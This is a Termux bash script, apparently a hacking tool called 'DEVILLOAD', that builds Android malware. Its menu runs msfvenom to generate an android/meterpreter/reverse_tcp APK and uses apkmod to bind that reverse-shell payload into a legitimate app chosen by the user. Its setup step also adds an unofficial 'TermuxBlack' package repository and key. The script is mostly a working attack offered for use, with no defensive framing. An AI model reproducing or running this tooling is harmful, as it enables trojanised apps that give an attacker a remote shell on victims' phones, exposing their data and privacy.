#!/data/data/com.termux/files/usr/bin/bash

exit_on_signal_SIGINT () {
    echo -e "\n\n\e${RED}[✗] Received INTR call - Exiting...\e[0m"
    exit 0
}
trap exit_on_signal_SIGINT SIGINT


# LoadingBar
progreSh() {
    LR='\033[1;31m'
    LG='\033[1;32m'
    LY='\033[1;33m'
    LC='\033[1;36m'
    LW='\033[1;37m'
    NC='\033[0m'
    if [ "${1}" = "0" ]; then TME=$(date +"%s"); fi
    SEC=`printf "%04d\n" $(($(date +"%s")-${TME}))`; SEC="$SEC sec"
    PRC=`printf "%.0f" ${1}`
    SHW=`printf "%3d\n" ${PRC}`
    LNE=`printf "%.0f" $((${PRC}/2))`
    LRR=`printf "%.0f" $((${PRC}/2-12))`; if [ ${LRR} -le 0 ]; then LRR=0; fi;
    LYY=`printf "%.0f" $((${PRC}/2-24))`; if [ ${LYY} -le 0 ]; then LYY=0; fi;
    LCC=`printf "%.0f" $((${PRC}/2-36))`; if [ ${LCC} -le 0 ]; then LCC=0; fi;
    LGG=`printf "%.0f" $((${PRC}/2-48))`; if [ ${LGG} -le 0 ]; then LGG=0; fi;
    LRR_=""
    LYY_=""
    LCC_=""
    LGG_=""
    for ((i=1;i<=13;i++))
    do
    	DOTS=""; for ((ii=${i};ii<13;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LRR_="${LRR_}#"; else LRR_="${LRR_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${DOTS}${LY}............${LC}............${LG}............ ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 1 ]; then sleep .05; fi
    done
    for ((i=14;i<=25;i++))
    do
    	DOTS=""; for ((ii=${i};ii<25;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LYY_="${LYY_}#"; else LYY_="${LYY_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${DOTS}${LC}............${LG}............ ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 14 ]; then sleep .05; fi
    done
    for ((i=26;i<=37;i++))
    do
    	DOTS=""; for ((ii=${i};ii<37;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LCC_="${LCC_}#"; else LCC_="${LCC_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${LC}${LCC_}${DOTS}${LG}............ ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 26 ]; then sleep .05; fi
    done
    for ((i=38;i<=49;i++))
    do
    	DOTS=""; for ((ii=${i};ii<49;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LGG_="${LGG_}#"; else LGG_="${LGG_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${LC}${LCC_}${LG}${LGG_}${DOTS} ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 38 ]; then sleep .05; fi
    done
}

printf "\n\n\n\n\n\n\n\n\n\n"
progreSh 0
progreSh 50
progreSh 100
printf "\n\n\n\n\n\n\n\n\n\n"  
clear







# requirements
if ! hash python &>/dev/null;then
    echo -e $BOLD Installing python....
    pkg i python
else
    echo -e $BOLD python Installed!
fi
if ! pip show lolcat &>/dev/null;then
    echo -e $BOLD Installing lolcat....
    pip3 install lolcat
else
    echo -e $BOLD lolcat Installed!
fi
if ! hash ncurses &>/dev/null;then
    echo -e $BOLD Installing python....
    pkg i ncurses ncurses-utils
else
    echo -e $BOLD ncurses Installed!
fi
if ! hash apkmod &>/dev/null;then
    echo -e $BOLD Installing python....
    mkdir -p $PREFIX/etc/apt/sources.list.d && printf "deb https://hax4us.github.io/TermuxBlack/ termuxblack main" > $PREFIX/etc/apt/sources.list.d/termuxblack.list
    wget -q https://hax4us.github.io/TermuxBlack/termuxblack.key -O termuxblack.key && apt-key add termuxblack.key && rm termuxblack.key
    apt-get update -yq --silent
    pkg i apkmod
else
    echo -e $BOLD apkmod Installed!
fi

#colors
BOLD="$(printf '\033[1m')"
BLUE="$(printf '\033[34m')"
RED="$(printf '\033[31m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"
GREENBG="$(printf '\033[42m')"
ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"
CYANBG="$(printf '\033[46m')"
WHITEBG="$(printf '\033[47m')"
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
while true ;do
clear
sleep 0.02
echo -e $MAGENTA"=========================[+]==================================="
echo -e "\033[36;1m
                   ┌─────────────────────────┐
                   │╺┳┓┏━╸╻ ╻╻╻  ╻  ┏━┓┏━┓╺┳┓│
                   │ ┃┃┣╸ ┃┏┛┃┃  ┃  ┃ ┃┣━┫ ┃┃│
                   │╺┻┛┗━╸┗┛ ╹┗━╸┗━╸┗━┛╹ ╹╺┻┛│
                   └─────────────────────────┘
\033[0m"

echo -e                   "                        VERSION : 3.0-beta           "
echo -e $MAGENTA"=========================[+]==================================="
echo
echo -e $CYAN          "............>>> CODED BY    : D4RKD3V7L <<<.............."
echo -e $CYAN          "............>>> MODIFIED BY : GUARDIAN  <<<.............."
echo -e $CYAN          "............>>> ENHANCED BY : kNIGHT    <<<.............."
echo -e $BOLD ""
echo -e "AVAILABLE \033[36mOPTIONS: \033[0m"
echo ""


echo -e $BOLD "[1] MAKE MSF PAYLOAD \033[0m"
echo -e $BOLD ""
echo -e $BOLD "[2] BIND PAYLOAD WITH APKMOD \033[0m"
echo -e $BOLD ""
echo -e $BOLD "[3] EXIT \033[0m"
echo -e "\e[0m"

read -p $'\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m \e[1;36m Choose An Option: \e[0m' ch


case $ch in
    1|01)
	echo -e "\e[1;96m"    
	echo -ne $BOLD [*] "Enter your local IP for LHOST: "
	read lhost
	echo -ne $BOLD [*] "Enter your port number for LPORT: "
	read lport
	echo -ne $BOLD [*] "Enter your apk file name here [with extension!!!!!]: "
	read apk
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $apk || echo -e $RED Invalid Apk!!!!
	echo -e $BOLD ""
	echo -e "\e[36m PAYLOAD CREATED CHECK IN YOUR FILE MANAGER \e[0m"
	sleep 5
	;;
    
    2|02)
	echo -e "\e[1;94m"
	echo -e "\e[1;96m"    
	echo -ne $BOLD [*] "Enter your local IP for LHOST: "
	read lhost
	echo -ne $BOLD [*] "Enter your port number for LPORT: "
	read lport
	echo -ne $BOLD [*] "Enter path to apk you want to bind: "
	read path
	apkmod -b $path -o /storage/bindedmsf.apk LHOST=$lhost LPORT=$lport || apkmod -u
	echo -e $BOLD ""
	echo -e "\e[36m PAYLOAD CREATED CHECK IN YOUR FILE MANAGER \033[0m"
	sleep 5
	;;
    3)
	echo -e $BOLD "Exiting....!"
	exit 0
	;;
    *)
	echo -e "\033[31;1m[!] Invalid Input! Exiting... \033[0m"
	exit 0
	;;
esac
done
